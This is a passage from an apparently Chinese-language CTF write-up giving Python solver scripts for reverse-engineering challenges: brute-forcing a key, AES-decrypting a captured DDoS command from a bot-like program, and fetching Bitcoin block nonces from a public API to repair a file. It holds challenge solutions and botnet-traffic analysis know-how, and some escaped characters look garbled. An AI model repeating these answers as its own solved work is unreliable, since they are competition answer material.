        byte_804A441 = ord(key[i+1])
        choice = (byte_804A440 &gt;&gt; 2) &amp; 3
        if choice == 0:
            process0()
        elif choice == 1:
            process1()
        elif choice == 2:
            process2()
        elif choice == 3:
            process3()
        key2.append(byte_804A440)
        key2.append(byte_804A441)

    for num in key2:
        key3.append((num &amp; 0xF) + 0x61)
        key3.append((num &gt;&gt; 4) + 0x61)

    return ''.join([chr(num) for num in key3])

final_key = 'ieedcpgdhkedddfenkfaifgggcgbbbgf'
origin_key = ''

for n in range(0, len(final_key), 4):
    part_key = final_key[n:n+4]
    for i in range(0x20, 0x7f):
        for j in range(0x20, 0x7f):
            key = chr(i) + chr(j)
            key_stream = generate(key)
            if key_stream == part_key:
                origin_key += key

print origin_key
```

    

在反推nkfa时可得到两个结果，根据语义得到Flag为H4ck1ngT0TheGate

<br>

**Re300**

程序接受管理服务器发来的控制指令进行相应的操作，根据流量包，管理服务器发送了DDos的SYN攻击指令，但是对指令数据做了AES加密，分析程序可得到key，于是解密

```
from Crypto.Cipher import AES

data1 = [
0x06, 0x00, 0x00, 0x00, 0xf1, 0x4e, 0x0b, 0xfe, 
0x2d, 0x94, 0xc3, 0x5c, 0x4b, 0xc6, 0x3a, 0x63, 
0x54, 0x0d, 0xd5, 0x25, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0xb1, 0x2b, 0x36, 0xee, 
0xda, 0xb3, 0x5c, 0x0b, 0x08, 0x9f, 0x58, 0x7e, 
0x20, 0xeb, 0x8d, 0x01, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x7d, 0xf7, 0x6b, 0x0c, 
0x1a, 0xb8, 0x99, 0xb3, 0x3e, 0x42, 0xf0, 0x47, 
0xb9, 0x1b, 0x54, 0x6f, 0x47, 0x8d, 0x65, 0x40, 
0x86, 0xb4, 0x7b, 0xd5, 0xb6, 0x4b, 0x40, 0xf6, 
0xd6, 0x8d, 0x61, 0xd8, 0xb2, 0xed, 0xf9, 0x5c, 
0x17, 0xe1, 0xc8, 0xae, 0x73, 0x19, 0x3c, 0x50, 
0x45, 0xd5, 0x7a, 0xee, 0xcc, 0x31, 0x00 ]

data2 = []

key = 'x2Bx7Ex15x16x28xAExD2xA6xABxF7x15x88x09xCFx4Fx3C'

cipher = AES.new(key)

for i in range(0, 0x1a):
    encrypt_data = data1[4+i*16:4+16+i*16]
    plain = cipher.decrypt(''.join([chr(num) for num in encrypt_data]))
    data2.append(plain)

print data2
```

得到ip为172.16.20.59，port为80，md5(ip:port)就得到flag

<br>

**Re400**

考查区块链的知识，幸亏之前听过实验室的小伙伴分享，给的magic_file是一个区块链记录，具体的是每个区块80个字节，每个块中的第4-36字节是上一块的hash值，第76-80字节是nonce，但是发现这个区块链中除了开始几个区块之外后面的区块的nonce都被清除了，程序的开始部分是在计算出每个区块的nonce值，由于一共有3400个区块，因此计算出所有的nonce需要花费很长的时间，另外最后的区块的hash值00000000d66d589aa63025b450d32cc7679e3969d62b240b348332acc16eb582，通过google发现这个区块链是公开的，因此就可以知道这个区块链所有区块的nonce，接下来可以通过查询区块的api获得之前所有区块的nonce

```
import requests
 
r = requests.get('https://chain.api.btc.com/v3/block/00000000d66d589aa63025b450d32cc7679e3969d62b240b348332acc16eb582')
data = r.json()
end = 0x7c2bac1d
file = open('nonce', 'w')
 
while (True):
    file.write(str(data['data']['nonce']) + 'n')
    if data['data']['nonce'] == end:
        print 'end'
        break
    r = requests.get('https://chain.api.btc.com/v3/block/%s' % data['data']['prev_block_hash'])
    data = r.json()
```

然后把获得的nonce写进每个区块

```
import pwn
 
file1 = open('magic_file', 'rb')
file2 = open('nonce')
file3 = open('origin_magic_file', 'wb')
 
data1 = file1.read()
data1 = list(data1)
data2 = file2.readlines()
data3 = []
for line in data2:
    data3.append(pwn.p32(int(line[:-1])))
 
for i in range(0, 3400):
    data1[i*80+76] = data3[3399 - i][0]
    data1[i*80+77] = data3[3399 - i][1]
    data1[i*80+78] = data3[3399 - i][2]
    data1[i*80+79] = data3[3399 - i][3]
 
file3.write(''.join(data1))
file3.close()
```

最后使用生成的magic_file运行程序得到flag，另外CPU需要支持AVX指令集才能正常运行程序。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f61186d5d54202e2.jpg)[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cc5d036b04c82003.jpg)




